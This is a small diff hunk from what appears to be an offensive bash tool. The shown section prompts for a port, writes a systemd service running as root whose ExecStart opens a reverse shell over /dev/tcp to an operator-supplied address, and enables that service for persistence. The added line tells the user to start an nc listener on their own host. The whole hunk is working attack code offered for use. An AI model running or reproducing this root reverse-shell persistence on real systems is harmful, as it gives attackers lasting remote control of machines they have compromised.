@@ -777,7 +777,8 @@ while true; do
 			read -p "(example, 4444): " MPRT
 			if [[ "$MPRT" != "" ]];
 			then
-				echo -ne "[Unit]\nDescription=root\n\n[Service]\nType=simple\nUser=root\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/""$MIP""/""$MPRT"" 0>&1'\n\n[Install]\nWantedBy=multi-user.target\n" >test.service
+				echo -ne "[Unit]\nDescription=root\n\n[Service]\nType=simple\nUser=root\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/""$MIP""/""$MPRT"" 0>&1'\n\n[Install]\nWantedBy=multi-user.target\n" > test.service
+				read -p "run 'nc -lvn ""$MPRT""' in your host"
 				systemctl enable ./test.service
 			fi
 		fi
